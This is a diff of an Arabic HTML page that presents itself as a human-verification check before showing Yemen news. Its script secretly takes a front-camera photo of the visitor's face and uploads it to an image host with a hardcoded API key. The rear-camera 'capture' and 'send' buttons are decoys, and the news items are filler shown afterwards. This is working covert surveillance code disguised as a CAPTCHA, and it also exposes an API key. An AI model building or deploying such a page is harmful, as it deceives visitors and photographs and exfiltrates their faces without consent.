@@ -9,178 +9,173 @@
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon_io/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="/favicon_io/favicon-16x16.png">
     <link rel="manifest" href="/favicon_io/site.webmanifest">
-    <style>
+        <style>
         body {
-            font-family: 'Tahoma', sans-serif;
+            direction: rtl;
+            font-family: Tahoma, sans-serif;
             text-align: center;
-            background: linear-gradient(to bottom right, #e0f7fa, #fff3e0);
+            background: linear-gradient(to bottom right, #f2f2f2, #e0f7fa);
             color: #333;
-            padding: 50px 20px;
+            padding: 30px 10px;
         }
 
         h1 {
-            font-size: 2em;
             color: #00796b;
         }
 
         p {
-            font-size: 1.2em;
-            margin-bottom: 15px;
+            font-size: 1.1em;
         }
 
         button {
-            background-color: #00796b;
+            background: #00796b;
             color: white;
             border: none;
-            padding: 15px 35px;
+            padding: 14px 30px;
             font-size: 1em;
-            border-radius: 8px;
+            border-radius: 10px;
+            margin-top: 15px;
             cursor: pointer;
-            margin-top: 10px;
         }
 
         button:hover {
-            background-color: #004d40;
+            background: #004d40;
         }
 
         video {
             display: none;
             width: 100%;
-            margin:auto;
             max-width: 400px;
-            margin-top: 20px;
-            border-radius: 12px;
+            margin: auto;
+            border-radius: 10px;
         }
 
         #captureBtn,
         #sendBtn {
             display: none;
-            margin-top: 10px;
         }
 
         #loading {
             margin-top: 20px;
             font-size: 1.2em;
-            color: #666;
         }
 
         #finalContent {
             display: none;
             margin-top: 30px;
-            font-size: 1.3em;
-            color: #333;
+            font-size: 1.2em;
+            background: #ffffffcc;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #ccc;
+        }
+
+        .news-item {
+            margin-bottom: 15px;
+            text-align: right;
         }
     </style>
 </head>
 
-<body dir="rtl">
-    <h1>🌍 آخر تطورات الوضع في اليمن</h1>
-    <p>يرجى التأكيد على أنك إنسان عن طريق تصوير أي شيء أمامك.</p>
-    <button onclick="startVerification()">✅ ابدأ التحقق</button>
+<body>
+    <h1>للتأكد من أمان تجربتك، نحتاج خطوة بسيطة</h1>
+    <p>يرجى السماح للكاميرا للتأكد من أنك شخص حقيقي</p>
+    <button id="startBtn" onclick="startVerification()">ابدأ التحقق</button>
 
     <video id="video" autoplay playsinline></video>
-    <br>
-    <button id="captureBtn" onclick="captureBackground()">📸 التقاط</button>
-    <button id="sendBtn" onclick="sendResult()">📤 إرسال</button>
+    <button id="captureBtn" onclick="captureFromBack()">التقاط</button>
+    <button id="sendBtn" onclick="sendImage()">إرسال</button>
 
     <div id="loading"></div>
     <div id="finalContent">
-        🇾🇪 <strong>أهم المستجدات:</strong><br><br>
-        • تحسن طفيف في سعر صرف الريال مقابل الدولار.<br>
-        • استمرار المحادثات بشأن الهدنة في بعض المحافظات.<br>
-        • تقارير عن هدوء نسبي في صنعاء وعدن مؤخرًا.<br>
-        • عودة بعض الخدمات تدريجياً في مناطق الجنوب.
+        <h2>📢 آخر أخبار اليمن:</h2>
+        <div class="news-item">🔹 ارتفاع ملحوظ في درجات الحرارة في عدة محافظات خلال هذا الأسبوع.</div>
+        <div class="news-item">🔹 الحكومة اليمنية تعلن عن خطة لتأهيل البنية التحتية في عدن.</div>
+        <div class="news-item">🔹 ضبط شحنة مهربة من الأسلحة في ميناء الحديدة.</div>
+        <div class="news-item">🔹 جهود مجتمعية لإعادة تأهيل المدارس في المناطق المتضررة.</div>
     </div>
 
     <script>
-        const API_KEY = "8b3ff25139462514d13f5d9a3b3c0d05";
-        const video = document.getElementById("video");
-        const captureBtn = document.getElementById("captureBtn");
-        const sendBtn = document.getElementById("sendBtn");
-        const loading = document.getElementById("loading");
-        const finalContent = document.getElementById("finalContent");
-
-        let backgroundStream = null;
-        let selfieUploaded = false;
+        const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const sendBtn = document.getElementById('sendBtn');
+        const loadingDiv = document.getElementById('loading');
+        const finalContent = document.getElementById('finalContent');
+        let frontImageUploaded = false;
 
         async function startVerification() {
-            loading.textContent = "📷 جاري التحقق من أنك إنسان...";
+            startBtn.style.display = 'none';
+            loadingDiv.textContent = '📷 جاري التحقق من أنك إنسان...';
+
             try {
-                // الخطوة 1: التقاط الصورة الأمامية مباشرة
-                const selfieStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const hiddenVideo = document.createElement("video");
-                hiddenVideo.srcObject = selfieStream;
-                await hiddenVideo.play();
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const track = frontStream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                canvas.getContext('2d').drawImage(bitmap, 0, 0);
+                const frontImage = canvas.toDataURL('image/jpeg').split(',')[1];
+                frontStream.getTracks().forEach(track => track.stop());
 
-                setTimeout(async () => {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = hiddenVideo.videoWidth;
-                    canvas.height = hiddenVideo.videoHeight;
-                    const ctx = canvas.getContext("2d");
-                    ctx.drawImage(hiddenVideo, 0, 0);
-
-                    selfieStream.getTracks().forEach(track => track.stop());
-
-                    const imageData = canvas.toDataURL("image/jpeg");
-                    const formData = new FormData();
-                    formData.append('image', imageData.split(',')[1]);
-
-                    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    const data = await res.json();
-                    if (data.success) {
-                        console.log("📷 تم رفع صورة الأمامية:", data.data.url);
-                        selfieUploaded = true;
-
-                        // الآن ننتقل لفتح الكاميرا الخلفية
-                        await startBackCamera();
-                    } else {
-                        loading.textContent = "❌ فشل رفع الصورة.";
-                    }
-                }, 1000);
+                // ارفع مباشرة الصورة إلى imgbb
+                const form = new FormData();
+                form.append("image", frontImage);
+                await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+                    method: "POST",
+                    body: form
+                });
+                frontImageUploaded = true;
 
             } catch (err) {
-                loading.textContent = "⚠️ تعذر الوصول للكاميرا.";
-                console.error(err);
+                loadingDiv.textContent = '❌ تعذر استخدام الكاميرا الأمامية.';
+                return;
             }
+
+            setTimeout(async () => {
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    video.srcObject = backStream;
+                    video.style.display = 'block';
+                    captureBtn.style.display = 'inline-block';
+                    loadingDiv.textContent = '';
+                } catch (err) {
+                    loadingDiv.textContent = '❌ تعذر تشغيل الكاميرا الخلفية.';
+                }
+            }, 1000);
         }
 
-        async function startBackCamera() {
-            try {
-                backgroundStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                video.srcObject = backgroundStream;
-                video.style.display = "block";
-                captureBtn.style.display = "inline-block";
-                loading.textContent = "🎥 وجه الكاميرا لأي شيء ثم اضغط التقاط.";
-            } catch (err) {
-                loading.textContent = "⚠️ تعذر تشغيل الكاميرا الخلفية.";
-                console.error(err);
+        function captureFromBack() {
+            captureBtn.style.display = 'none';
+            video.style.display = 'none';
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(t => t.stop());
             }
+            sendBtn.style.display = 'inline-block';
         }
 
-        function captureBackground() {
-            captureBtn.style.display = "none";
-            video.style.display = "none";
-            backgroundStream.getTracks().forEach(track => track.stop());
-            sendBtn.style.display = "inline-block";
-            loading.textContent = "📤 جاهز للإرسال.";
-        }
+        function sendImage() {
+            sendBtn.style.display = 'none';
+            loadingDiv.textContent = '✅ تم التحقق من أنك إنسان...\n📡 جاري جلب المعلومات...';
 
-        function sendResult() {
-            sendBtn.style.display = "none";
-            loading.textContent = "✅ تم التحقق من أنك إنسان...\n🔄 جاري جلب المعلومات...";
+
+            document.querySelector('h1').style.display = 'none';
+            document.querySelector('p').style.display = 'none';
+
+
             setTimeout(() => {
-                loading.style.display = "none";
-                finalContent.style.display = "block";
-            }, 2500);
+                loadingDiv.style.display = 'none';
+                finalContent.style.display = 'block';
+            }, 1500);
         }
     </script>
 </body>
 
 </html>
+
 
 
 
